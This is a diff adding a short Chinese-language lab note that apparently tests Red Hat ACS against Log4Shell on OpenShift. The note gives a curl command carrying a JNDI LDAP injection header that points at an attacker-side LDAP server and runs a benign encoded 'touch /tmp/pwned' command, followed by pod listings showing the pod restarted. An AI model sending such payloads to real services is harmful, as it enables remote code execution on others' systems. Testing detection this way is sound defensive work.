@@ -20780,4 +20780,19 @@ spec:
     targetPort: 8080
   wildcardPolicy: None
 
+#### 测试 ACS - log4shell 
+#### 测试
+#### 获取 pod 信息，检查 pod AGE
+#### 触发 log4shell 漏洞利用
+#### 等待 60s
+#### 再次获取 pod 信息，检查 pod AGE
+#### pod 已重启
+
+$ oc get pods ; curl -v http://log4shell-app-test.apps.ocp4.example.com -H 'X-Api-Version: ${jndi:ldap://192.168.56.65:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}' ; sleep 60;  oc get pods
+NAME                                       READY   STATUS    RESTARTS       AGE
+log4shell-app-5647489c-lzmrx               1/1     Running   0              15s
+...
+Hello, world!
+NAME                                       READY   STATUS    RESTARTS       AGE
+log4shell-app-5647489c-lzc7d               1/1     Running   0              30s
 ```
